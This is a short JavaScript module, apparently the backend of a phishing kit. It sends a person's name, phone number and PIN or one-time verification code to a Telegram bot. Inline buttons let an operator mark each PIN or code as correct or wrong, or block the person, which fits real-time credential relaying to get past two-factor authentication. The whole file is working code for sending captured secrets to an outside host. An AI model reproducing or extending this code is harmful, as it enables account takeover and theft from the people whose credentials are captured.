const axios = require('axios');

// ---------------- MULTI-BOT FRIENDLY FUNCTION ----------------
// bot: { botToken, chatId, botId } 
async function sendTelegramMessage(bot, { type, name, phone, requestId }) {
    const text = type === 'PIN'
        ? `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${requestId}`
        : `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCODE: ${requestId}`;

    const reply_markup = {
        inline_keyboard: type === 'PIN'
            ? [[
                { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
                { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
                { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
              ]]
            : [[
                { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
                { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
                { text: '✅ Correct Code + ❌ Wrong PIN', callback_data: `code_pin:${requestId}` }
              ]]
    };

    const url = `https://api.telegram.org/bot${bot.botToken}/sendMessage`;

    try {
        const res = await axios.post(url, { chat_id: bot.chatId, text, reply_markup });
        console.log(`✅ Telegram message sent by ${bot.botId} (Project B):`, res.data);
    } catch (err) {
        console.error(`❌ Telegram error for ${bot.botId} (Project B):`, err.response?.data || err.message);
    }
}

module.exports = { sendTelegramMessage };
